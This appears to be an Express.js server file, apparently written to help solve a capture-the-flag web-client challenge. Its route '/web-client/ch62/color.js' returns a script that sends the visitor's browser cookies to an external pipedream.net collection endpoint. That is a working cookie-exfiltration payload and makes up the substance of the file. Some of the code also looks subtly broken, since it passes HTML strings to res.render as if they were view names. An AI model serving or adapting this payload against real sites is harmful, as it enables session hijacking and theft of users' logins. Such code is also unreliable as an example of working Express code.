if (process.env.NODE_ENV !== 'production') {
    require("dotenv").config()
}

const express = require("express");
const expressLayouts = require("express-ejs-layouts")
const bodyParser = require("body-parser")
const methodOverride = require("method-override")

app = express();

app.use(express.json())
app.use(express.static("public"))
app.set("view engine", "ejs")
app.set("layout", "layouts/layout")
app.use(expressLayouts)
app.use(methodOverride('_method'))
app.use(bodyParser.urlencoded({limit: "10mb", extended: true}))
// app.use(express.static(__dirname + 's/public/img')); 
 
//test sur la page principal
app.get("/", (req, res) => {
    res.render("<h1>meow</h1>")
})

app.get("/web-client/ch62/color.js", (req, res) => {
    res.render(`<script>document.location = 'https://eocvkn4m3kpce3q.m.pipedream.net' + '?cookies=' + document.cookie;console.log("meow");</script>`)
})


app.listen(3000, () => {
    console.log("Listening on  port 3000")
})
